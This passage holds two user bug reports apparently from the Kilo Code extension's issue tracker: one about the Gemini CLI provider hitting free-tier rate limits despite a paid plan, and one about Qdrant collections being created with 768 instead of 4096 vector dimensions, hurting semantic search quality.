- Gemini CLI is properly authenticated with `gcloud auth`
- Google AI Pro subscription is active and confirmed in Google Cloud Console
- The CLI works correctly when used standalone outside of Kilo Code
- Inside Kilo Code, selecting Gemini CLI as provider fails with free tier rate limits

### Reproduction steps

1. Open Kilo Code
2. Start a new chat or prompt
3. Select "Gemini CLI" as the provider
4. Attempt to send a message or query
5. Observe the error message after fewer interactions: "Free Tier Rate Limit Exceeded"

### Provider

Gemini CLI

### Model

gemini-3.0-pro

### System Information

OS: Windows 11 with WSL 2 (Ubuntu)
Kilo Code: Latest version
Gemini CLI: Latest (gcloud)
Google Cloud SDK: Updated
Node.js: Latest LTS

### Plugin Type

title: Incorrectly setting the vector dimensions for Qdrant for semantic search leads to a huge degradation in search results quality.
body: ### Plugin Type VSCode Extension ### App Version 4.140.1 (7fe600c5) ### Description The most powerful embedding provider for KiloCode is the Qwen 3 Embedding 8b model with 4096 dimensions. This model ranks significantly higher in vectorization benchmarks than embeddings from OpenAI and other vendors. However, Qdrant settings show that Kilo Code has recently been causing significant damage to vector databases by incorrectly configuring them for the vector dimensionality. While previously the databases were correctly created with 4096 dimensions, now 768 dimensions are being erroneously selected. Somehow, this still works, probably due to vector conversion, but it's a COMPLETE DISASTER in terms of search quality. Reducing the vector dimensionality in this way makes KiloCode's search not just stupid, but terribly stupid. I conducted various semantic tests, and I can say that the quality of semantic search is now simply destroyed, as it often produces completely nonsensical results. ### Reproduction steps 1. Delete Index 2. Select Qwen 3 Embedding 8b for embeddings (reproduced with other Qwen models too) 3. Start index creation 4. Open Qdrant Collection on administration site for checking REAL vector dimension ### Provider _No response_ ### Model _No response_ ### System Information _No response_
